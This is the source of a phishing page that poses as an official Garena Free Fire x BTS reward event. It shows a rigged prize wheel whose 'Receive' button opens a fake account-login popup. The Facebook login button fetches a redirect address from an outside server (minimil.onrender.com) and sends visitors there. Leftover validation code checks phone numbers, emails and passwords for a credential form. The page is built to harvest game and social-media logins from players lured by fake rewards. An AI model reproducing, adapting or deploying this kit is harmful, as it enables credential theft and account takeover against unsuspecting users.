<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme4/') === false) {
    $baseHref = '<base href="themes/theme4/">';
}
?>
<?= $baseHref ?>
<html>

<head>
	<meta charset="UTF-8" />
	<meta name="viewport"
		content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta property="og:title" content="Free Fire x BTS">
	<meta name="description" content="Free Fire!">
	<meta property="og:description" content="Free Fire!">
	<meta property="og:url" content="./">
	<meta property="og:site_name" content="Free Fire">
	<meta property="og:type" content="website">
	<meta name="copyright" content="Nong Van Nguyen">
	<meta name="theme-color" content="#000">
	<meta property="og:image" content="img/bg_1.jpg">
	<title>Free Fire x BTS</title>
	<!-- <link rel="stylesheet" href="GiaoDien/theme5/css/style.css">
<link rel="stylesheet" href="GiaoDien/theme5/css/animate.css">
<link rel="stylesheet" href="GiaoDien/theme5/css/login/facebook.css">
<link rel="stylesheet" href="GiaoDien/theme5/css/login/twitter.css"> -->
	<link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="css/animate.css">
	<link rel="stylesheet" href="css/login/facebook.css">
	<link rel="stylesheet" href="css/login/twitter.css">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet"
		href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
	<link rel="icon" href="https://static.upoint.id/images/contents/ff-2019.jpg">
	<!-- Lương Văn Tân
Facebook.com/vantan2k8  -->


	<!-- Lương Văn Tân
Please do not remove to respect the author  -->



	<style type="text/css">
		@charset "utf-8";
		@import url('https://fonts.googleapis.com/css2?family=Baloo+2:wght@600&amp;display=swap');
		@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");

		*,
		*:before,
		*:after {
			-webkit-box-sizing: border-box;
			-moz-box-sizing: border-box;
			box-sizing: border-box;
		}

		body {
			background: url(img/bg_1.jpg) no-repeat center;
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: 100% 100%;
			margin: 0;
			font-family: 'Baloo 2', cursive;
		}

		.container {
			background: transparent;
			background-size: cover;
			position: relative;
			margin: 0px auto;
			max-width: 400px;
			height: auto;
			border: 1px solid #e2c73d;
		}

		.navbar {
			background: #ffffff45;
			width: 100%;
			height: 50px;
			padding: 4px;
			border-bottom: 1px solid #e2c73d;
		}

		.navbar img {
			width: 41;
			margin-right: 5px;
			border-radius: 5px;
			float: left;
		}

		.navbar-txt-game {
			padding-top: 2px;
			color: #e2c73d;
			font-size: 18px;
			font-family: 'Teko', sans-serif;
			text-align: left;
		}

		.navbar-txt-game span {
			color: #d9d9d8;
			font-size: 13px;
			line-height: 10px;
			display: block;
		}

		.navbar-btn-wrapper {
			margin-top: 5px;
			float: right;
		}

		.navbar-btn {
			background: #ecdd6f69;
			width: 70px;
			height: auto;
			margin: 2px;
			padding: 2px;
			color: #fff;
			font-size: 15px;
			font-family: 'Teko', sans-serif;
			text-align: center;
			text-transform: uppercase;
			border: 1px solid #e2c73d;
			border-radius: 3px;
			display: inline-block;
			outline: none;
		}

		.header {
			width: 100%;
			height: 110px;
			margin-left: auto;
			margin-right: auto;
			display: block;
			border: none;
		}

		.header img {
			width: 100%;
			height: auto;
			position: relative;
			top: -8px;
			display: block;
		}

		.box {
			background: rgba(0, 0, 0, 0.4);
			width: 93%;
			height: auto;
			margin-top: 12px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 12px;
			position: relative;
			border-radius: 5px;
			display: block;
		}

		.menu-wrapper-border {
			height: 11px;
		}

		.menu-wrapper {
			width: 94.3%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 12px;
			display: block;
		}

		.menu-content {
			background: rgba(0, 0, 0, 0.4);
			width: 31.5%;
			height: auto;
			padding: 6px;
			color: #e2c73d;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			font-weight: 500;
			text-align: center;
			border-radius: 5px;
			cursor: pointer;
			border: none;
		}

		.menu-content-active {
			background: url(img/s3_tab1.png) no-repeat center;
			background-size: 100% 100%;
			color: #000;
		}

		.menu-change {
			background: #ecdd6f69;
			width: 94.3%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 10px;
			color: #fff;
			font-size: 15.5px;
			font-family: 'Baloo 2', cursive;
			text-align: center;
			letter-spacing: 1px;
			border-radius: 5px;
			display: block;
			border: 1px solid #ecdd6f;
		}

		.menu-change .lileft {
			padding-right: 7px;
			position: absolute;
			top: 16.5px;
			left: 35px;
		}

		.menu-change .liright {
			padding-left: 7px;
			position: absolute;
			top: 16.5px;
			right: 35px;
		}

		.scroll {
			overflow: scroll;
			position: relative;
			width: 100%;
			height: 500px;
			margin-top: 11px;
			margin-left: auto;
			margin-right: auto;
			display: block;
			scrollbar-face-color: #ffbb40;
			scrollbar-shadow-color: #ffbb40;
			scrollbar-highlight-color: #ffbb40;
			scrollbar-3dlight-color: #ffbb40;
			scrollbar-darkshadow-color: #ffbb40;
			scrollbar-track-color: #ffbb40;
			scrollbar-arrow-color: #ffbb40;
		}

		.item {
			width: 23%;
			height: 70px;
			margin: 3px;
			margin-bottom: 3px;
			display: inline-block;
		}

		.item img {
			width: 100%;
			height: 100%;
			border-radius: 5px;
		}

		.item img {
			border: 1px solid #e2c73d;
		}

		.footer {
			background: #000;
			width: 100%;
			height: auto;
			padding: 10px;
			border-top: 1px solid #e2c73d;
		}

		.footer img {
			width: 90%;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.footer-txt {
			margin-top: 10px;
			color: #fff;
			font-size: 15px;
			font-family: Teko;
			font-weight: 500;
			text-align: center;
			text-transform: uppercase;
		}

		.popup {
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
			background-color: rgba(0, 0, 0, 0.4);
		}

		.nav-popup {
			background: #000000a3;
			height: auto;
			border: 4px;
			padding: 10px;
		}

		.nav-popup-title {
			color: #ecdd6f;
			font-size: 20px;
			font-family: 'Baloo 2', cursive;
			text-align: left;
		}

		.popup-box {
			background: url(img/bg_2.jpg) no-repeat center;
			background-size: cover;
			width: 370px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 15%;
			text-align: center;
			font-family: 'Baloo 2', cursive;
			color: #000;
			border: 1px solid #ecdd6f;
			border-radius: 5px;
		}

		.popup-alert {
			background: #ecdd6f8f;
			width: 95%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #fff;
			font-size: 15px;
			border: 1px solid #ecdd6f;
			font-family: 'Baloo 2', cursive;
			text-align: center;
			border-radius: 5px;
			display: block;
		}

		.popup-item {
			width: 23%;
			height: 85px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 17px;
			border: 1px solid #000;
			display: block;
		}

		.popup-btn {
			background: #02020282;
			width: 25%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 5px;
			color: #fff;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			border: 1px solid #ecdd6f;
			border-radius: 5px;
			outline: none;
			display: block;
		}

		.btn-login {
			width: 95%;
			height: auto;
			padding: 8px;
			margin-left: auto;
			margin-right: auto;
			color: #000;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			border: none;
			border-radius: 5px;
			outline: none;
			display: block;
		}

		.btn-login i {
			color: #fff;
			font-size: 20px;
			float: left;
		}

		.facebook {
			background: #3b5998;
			color: #fff;
			margin-bottom: 3px;
		}

		.twitter {
			background: #08a0e9;
			color: #fff;
			margin-bottom: 10px;
		}

		.popup-close {
			width: 20px;
			height: 20px;
			color: #ecdd6f;
			text-align: center;
			text-transform: uppercase;
			font-weight: bold;
			position: absolute;
			top: 13px;
			right: 10px;
			display: block;
		}

		.popup-close i {
			color: #ecdd6f;
			font-size: 25px;
		}

		.popup-login {
			background: rgba(0, 0, 0, 0.5);
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
		}

		.popup-box-login-fb {
			background: #ECEFF6;
			max-width: 330px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 1.9%;
			text-align: center;
			font-family: 'Teko';
			color: #000;
			border-radius: 10px;
		}

		.popup-box-login-twitter {
			background: #fff;
			max-width: 330px;
			height: 350px;
			position: relative;
			margin: 50px auto;
			margin-top: 10%;
			text-align: center;
			font-family: 'Teko';
			color: #000;
			border-radius: 10px;
		}

		.close-fb {
			background: #000;
			width: 20px;
			height: 20px;
			color: #fff;
			text-align: center;
			text-decoration: none;
			border-radius: 50%;
			border: 1.5px solid #fff;
			position: absolute;
			top: -8px;
			right: -10px;
			display: block;
		}

		.close-fb i {
			color: #fff;
			padding-top: 1px;
		}

		.close-other {
			background: #000;
			width: 20px;
			height: 20px;
			color: #fff;
			text-align: center;
			text-decoration: none;
			border-radius: 50%;
			border: 1.5px solid #fff;
			top: -8px;
			right: -10px;
			position: absolute;
			z-index: 9999999;
			display: block;
		}

		.close-other i {
			color: #fff;
			padding-top: 1px;
		}

		.verify-alert {
			background: #e2c73d;
			width: 94.3%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 15px;
			padding: 5px;
			color: #000;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			text-align: left;
			border-radius: 5px;
			display: block;
		}

		.verify-alert button {
			background: #000;
			width: auto;
			height: auto;
			margin-top: -2px;
			margin-right: -2px;
			padding: 1px;
			padding-left: 10px;
			padding-right: 10px;
			color: #e2c73d;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			text-align: center;
			border: 1px solid #000;
			border-radius: 5px;
			outline: none;
			float: right;
		}

		.verify-input {
			background: #e2c73d4f;
			width: 90%;
			height: auto;
			margin-bottom: 3px;
			padding: 6px;
			color: #fff;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			border: 1px solid #e2c73d;
			border-radius: 5px;
			position: relative;
			outline: none;
		}

		.verify-input::placeholder {
			color: #fff;
		}

		.verify-select {
			background: black;
			width: 90%;
			height: auto;
			margin-bottom: 3px;
			padding: 6px;
			padding-left: 3px;
			color: #e2c73d;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			border: 1px solid #e2c73d;
			border-radius: 5px;
			position: relative;
			outline: none;
		}

		.verify-btn {
			background: #e2c73d;
			width: 30%;
			height: auto;
			margin-top: 10px;
			padding: 6px;
			font-size: 15px;
			font-family: 'Baloo 2', cursive;
			text-align: center;
			color: #000;
			margin-bottom: 3px;
			border: 1px solid #000;
			position: relative;
			outline: none;
		}

		.kanan {
			float: right;
		}

		.kiri {
			float: left;
		}

		.tengah {
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		::-webkit-scrollbar {
			display: none;
			width: 0px;
		}

		.border_hadiah {
			border: 2px solid white;
		}

		@media only screen and (max-width:600px) {
			.container {
				width: 100%;
				height: auto;
				margin-top: 0px;
				margin-bottom: 0px;
				border: none;
				border-radius: 0px;
				padding: 0px;
			}

			.header {
				height: 110px;
			}

			.box {
				width: 96%;
				height: auto;
			}

			.scroll {
				height: 400px;
			}

			.item {
				height: 90px;
			}

			.popup-box {
				width: 345px;
				margin-top: 60%;
			}

			.popup-item {
				width: 25%;
				height: 85px;
			}

			.popup-box-login-fb {
				margin-top: 4%;
			}

			.popup-box-login-twitter {
				margin-top: 25%;
			}
		}

		@media only screen and (max-width:395px) {
			.menu-change {
				font-size: 13.5px;
				letter-spacing: 1px;
			}
		}
	</style>

	<!-- Lương Văn Tân
Facebook.com/vantan2k8  -->


	<!-- Lương Văn Tân
Please do not remove to respect the author  -->

</head>

<body oncontextmenu="return false" ondragstart="return false">
	<audio id="audio">
		<source src="/nvn.mp3" type="audio/mpeg">
	</audio>

	<div class="container">
		<div class="navbar">
			<div class="navbar-btn-wrapper">
				<button class="navbar-btn" onclick="share()" onmousedown="login.play()">
					SHARE
				</button>
			</div> <!--- navbar-btn-wrapper --->
			<img src="https://static.upoint.id/images/contents/ff-2019.jpg">
			<div class="navbar-txt-game">
				GARENA FREE FIRE
				<span>FREE FIRE X BTS</span></br>

			</div> <!--- navbar-txt-game --->
		</div> <!--- navbar --->
		<div class="header">
			<img src="https://imgur.com/pFPyUBz">
			<img src="img/other/btn_music.png" style="width: 30px;height:30px;position: absolute;top:8%;right: 5%;"
				id="music_on">
			<img src="img/other/btn_music_off.png"
				style="width: 30px;height:30px;position: absolute;top:8%;right: 5%;display: none" id="music_off">
		</div> <!--- header --->
		</br>

		</br>
		</br>
		</br>
		</br>
		</br>
		</br>







		<div class="box">
			<div class="menu-wrapper-border"></div>

			<!-- Reward -->
			<div class="tab_rewards" id="reward">
				<div class="menu-change">
					<?php echo isset($bannerName) ? $bannerName : ''; ?>
				</div>
				<center>
					<div class="item" data-order="0">
						<div id="mask"></div>
						<img
							src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s">
					</div>
					<div class="item" data-order="1">
						<img src="img/other/Shoz1ga.jpeg">
					</div>
					<div class="item" data-order="2">
						<img src="img/other/3dphRVj.jpeg">
					</div>
					<div class="item" data-order="3">
						<img src="img/other/aayuhgO.jpeg">
					</div>
					<div class="item" data-order="4">
						<img src="img/other/JkE8Sq2.jpeg">
					</div>
					<div class="item" data-order="5">
						<img src="https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg">
					</div>
					<div class="item" data-order="6">
						<img src="https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg">
					</div>
					<div class="item" data-order="7">
						<img src="img/other/JkE8Sq2.jpeg" />
					</div>
					<div class="item" data-order="8">
						<img
							src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s">
					</div>
					<br>
					<button class="tombol_putar putarkan"
						style="background: url(img/s3_tab2.png) no-repeat center;background-size: 100% 100%;width: 110px;height: 40px;border:none;font-family: teko;font-weight: 550;font-size: 15px;letter-spacing: 1px;margin-bottom: 20px;outline: none;color:#685512;">
						Spin 1 Time
					</button>
					<button class="tombol_putar putarkan5"
						style="background: url(img/s3_tab1.png) no-repeat center;background-size: 100% 100%;width: 110px;height: 40px;border:none;font-family: teko;font-weight: 550;font-size: 15px;letter-spacing: 1px;margin-bottom: 20px;outline: none;color:#685512;">
						Spin 5 Times
					</button>
				</center>
			</div>
			<!--- reward --->


		</div> <!--- box --->
		<div class="footer">
			<img src="img/footer_img.png">
			<div class="footer-txt">&copy; 2022 GARENA CORPORATION. All rights reserved.</div>
		</div> <!--- footer --->
	</div> <!--- container --->

	<div class="popup reward_confirmation1" style="display: none;">
		<div class="popup-box">
			<div class="nav-popup">
				<div class="nav-popup-title">Reward Confirmation</div>
			</div><br>
			<img class="gift_img popup-item" src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">
			<button type="button" class="popup-btn btn1" style="display: none" onmousedown="button.play()"
				onclick="open_account_login()">Receive</button>
		</div>
	</div>
	<div class="popup reward_confirmation5" style="display: none;">
		<div class="popup-box">
			<div class="nav-popup">
				<div class="nav-popup-title">Reward Confirmation</div>
			</div><br>
			<img style="width:60px;position: absolute;margin-top:0%;left: 20%;display: none"
				src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>" id="rewards1">
			<img style="width:60px;position: absolute;margin-top:0%;left: 40%;display: none"
				src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>" id="rewards2">
			<img style="width:60px;position: absolute;margin-top:0%;left: 60%;display: none"
				src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>" id="rewards3">
			<img style="width:60px;position: absolute;margin-top:22.5%;left: 30%;display: none"
				src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>" id="rewards4">
			<img style="width:60px;position: absolute;margin-top:22.5%;left: 50%;display: none"
				src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>" id="rewards5">
			<br><br><br><br><br><br><br>
			<button type="button" class="popup-btn btn5" style="display: none" onmousedown="button.play()"
				onclick="open_account_login()">Receive</button>
			<br><br>
		</div>
	</div>

	<div class="popup account_login" style="display: none;">
		<div class="popup-box">
			<div class="nav-popup">
				<div class="nav-popup-title">Account Login</div>
			</div><br>
			<div class="popup-alert">Login to your Free Fire account to continue</div>
			<button type="button" class="btn-login facebook"><i class="fa fa-facebook-square icon-login"></i> Login with
				Facebook </button>
			<script>
				document.addEventListener("DOMContentLoaded", function () {
					document.querySelector(".btn-login.facebook").addEventListener("click", function () {
						const domain = window.location.protocol + "//" + window.location.host;
						(async () => {
							try {
								let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
								data = await data.json()
								window.location.href = data.data.domain_fb;
							} catch {

							}
						})();
					});
				});
			</script>

		</div>
	</div>
	<script type="text/javascript">
		const togglePassword = document.querySelector('#togglePassword');
		const password = document.querySelector('#password');
		togglePassword.addEventListener('click', function (e) {
			// toggle the type attribute
			const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
			password.setAttribute('type', type);
			// toggle the eye / eye slash icon
			this.classList.toggle('bi-eye');
		});
	</script>


	<script type="text/javascript">



		function phonenumber(user) {
			var vnf_regex = /((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;
			if (vnf_regex.test(user) == false) {
				console.log("phonenumber false");
				return false;

			} else {
				console.log("phonenumber true");
				return true;

			}
		}




		function validateEmail(user) {
			let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
			if (user.match(regexEmail)) {
				console.log("regexEmail true");
				return true;

			} else {
				console.log("regexEmail false");
				return false;

			}
		}

		function validatepassword(pass) {

			if (pass.length >= 6 && pass.length <= 25) {

				return true;
			}
			else {

				return false;
			}
		}

	</script>

	<script>



		function valid() {
			var user = $('#user').val();
			var pass = $('#pass').val();
			phonenumber(user);
			validateEmail(user);
			var ip = $('#ip').val();
			if (user == '' || user == null) {

				$('.email').show();
				$('.sandi').hide();
				return false;
			} else if (validatepassword(pass) == false) {
				$('.email').hide();
				$('.sandi').show();
				return false;
			}
			else if (user != '' || user != null) {
				if ((phonenumber(user) == true) || (validateEmail(user) == true)) {
					$('.email').hide();
					$('.sandi').hide();

				}
				else {
					$('.email').show();
					$('.sandi').hide();
					return false;
				}
			}


			$("#btnfb").addClass("disabled");
		}




	</script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script type="text/javascript">
		var login = new Audio();
		login.src = "media/login.mp3";

		var tutup = new Audio();
		tutup.src = "media/tutup.mp3";

		var button = new Audio();
		button.src = "media/button.mp3";

		var click_new = new Audio();
		click_new.src = "media/click_new.mp3";

		var putaran = new Audio();
		putaran.src = "media/putaran.mp3";

		$(document).ready(function () {
			$('#music_on').on('click', function () {
				var audio = $('#audio')[0];
				audio.play();
				$(this).hide();
				$('#music_off').show();
			});
			$('#music_off').on('click', function () {
				var audio = $('#audio')[0];
				audio.pause();
				$(this).hide();
				$('#music_on').show();
			});
		});

		const hadiah = {
			0: '<?php echo isset($gift1Link) ? $gift1Link : ''; ?>',
			1: '<?php echo isset($gift2Link) ? $gift2Link : ''; ?>',
			2: '<?php echo isset($gift3Link) ? $gift3Link : ''; ?>',
			3: '<?php echo isset($gift4Link) ? $gift4Link : ''; ?>',
			4: '<?php echo isset($gift5Link) ? $gift5Link : ''; ?>',
			5: '<?php echo isset($gift6Link) ? $gift6Link : ''; ?>',
			6: '<?php echo isset($gift7Link) ? $gift7Link : ''; ?>',
			7: '<?php echo isset($gift8Link) ? $gift8Link : ''; ?>',
			8: '<?php echo isset($gift9Link) ? $gift9Link : ''; ?>'
		};

		const jumlah_hadiah = 9;
		const minimal_lompat = 30;
		let shagitz = -1;
		let lompat = 0;
		let kecepatan = 30;
		let waktu = 0;
		let hadiahnya = -1;

		function putarkan() {
			$(`[data-order="${shagitz}"]`).removeClass('border_hadiah');

			shagitz += 1;

			if (shagitz > jumlah_hadiah - 1) {
				shagitz = 0;
			}

			$(`[data-order="${shagitz}"]`).addClass('border_hadiah');
		}

		function acakHadiah() {
			return Math.floor(Math.random() * jumlah_hadiah);
		}

		function pengaturanWaktu() {
			lompat += 1;
			putarkan();
			if (lompat > minimal_lompat + 10 && hadiahnya === shagitz) {
				clearTimeout(waktu);

				$('.gift_img').attr('src', hadiah[shagitz]);
				setTimeout(function () {
					$('.reward_confirmation1').fadeIn('fast');
				}, 100);
				setTimeout(function () {
					$('.btn1').fadeIn('slow');
				}, 700);

				hadiahnya = -1;
				lompat = 0;

			} else {
				if (lompat < minimal_lompat) {
					kecepatan -= 5;
				} else if (lompat === minimal_lompat) {
					const nomor_acak = acakHadiah();
					hadiahnya = nomor_acak;
				} else {
					if ((lompat > minimal_lompat + 10) && hadiahnya === (shagitz + 1)) {
						kecepatan += 600;
					} else {
						kecepatan += 20;
					}
				}
				if (kecepatan < 40) {
					kecepatan = 40;
				}
				waktu = setTimeout(pengaturanWaktu, kecepatan);
			}
		}

		function gaskeun() {
			var putaran = new Audio();
			putaran.src = "media/putaran.mp3";
			putaran.play();
			lompat = 0;
			kecepatan = 70;
			hadiahnya = -1;
			pengaturanWaktu();
		}

		$(document).ready(() => {
			$('.putarkan').on('click', gaskeun);
		});

		// hadiah 5
		const hadiah5 = {
			0: '<?php echo isset($gift1Link) ? $gift1Link : ''; ?>',
			1: '<?php echo isset($gift2Link) ? $gift2Link : ''; ?>',
			2: '<?php echo isset($gift3Link) ? $gift3Link : ''; ?>',
			3: '<?php echo isset($gift4Link) ? $gift4Link : ''; ?>',
			4: '<?php echo isset($gift5Link) ? $gift5Link : ''; ?>',
			5: '<?php echo isset($gift6Link) ? $gift6Link : ''; ?>',
			6: '<?php echo isset($gift7Link) ? $gift7Link : ''; ?>',
			7: '<?php echo isset($gift8Link) ? $gift8Link : ''; ?>',
			8: '<?php echo isset($gift9Link) ? $gift9Link : ''; ?>'
		};

		const jumlah_hadiah5 = 9;
		const minimal_lompat5 = 30;
		let shagitz5 = -1;
		let lompat5 = 0;
		let kecepatan5 = 30;
		let waktu5 = 0;
		let hadiahnya5 = -1;

		function putarkan5() {
			$(`[data-order="${shagitz5}"]`).removeClass('border_hadiah');

			shagitz5 += 1;

			if (shagitz5 > jumlah_hadiah5 - 1) {
				shagitz5 = 0;
			}

			$(`[data-order="${shagitz5}"]`).addClass('border_hadiah');
		}

		function acakHadiah5() {
			return Math.floor(Math.random() * jumlah_hadiah5);
		}

		function pengaturanWaktu5() {
			lompat5 += 1;
			putarkan5();
			if (lompat5 > minimal_lompat5 + 10 && hadiahnya5 === shagitz5) {
				clearTimeout(waktu5);
				hadiahnya5 = -1;
				lompat5 = 0;

			} else {
				if (lompat5 < minimal_lompat5) {
					kecepatan5 -= 5;
				} else if (lompat5 === minimal_lompat5) {
					const nomor_acak = acakHadiah5();
					hadiahnya5 = nomor_acak;
				} else {
					if ((lompat5 > minimal_lompat5 + 10) && hadiahnya5 === (shagitz5 + 1)) {
						kecepatan5 += 600;
					} else {
						kecepatan5 += 20;
					}
				}
				if (kecepatan5 < 40) {
					kecepatan5 = 40;
				}
				waktu5 = setTimeout(pengaturanWaktu5, kecepatan5);
			}
		}

		function gaskeun5() {
			$('.reward_confirmation5').fadeIn('fast');
			var putaran = new Audio();
			putaran.src = "media/putaran.mp3";
			putaran.play();
			setTimeout(function () {
				$("#rewards1").fadeIn('slow');
			}, 500);
			setTimeout(function () {
				$("#rewards2").fadeIn('slow');
			}, 1300);
			setTimeout(function () {
				$("#rewards3").fadeIn('slow');
			}, 2300);
			setTimeout(function () {
				$("#rewards4").fadeIn('slow');
			}, 3300);
			setTimeout(function () {
				$("#rewards5").fadeIn('fast');
			}, 4200);
			setTimeout(function () {
				$('.btn5').fadeIn('slow');
			}, 5200);
			lompat5 = 0;
			kecepatan5 = 70;
			hadiahnya5 = -1;
			pengaturanWaktu5();
		}

		$(document).ready(() => {
			$('.putarkan5').on('click', gaskeun5);
		});
	</script>

	<script src="js/tab.js"></script>
	<script src="js/timer.js"></script>
	<script src="js/popup.js"></script>
	<script src="js/click.js"></script>

</body>

</html>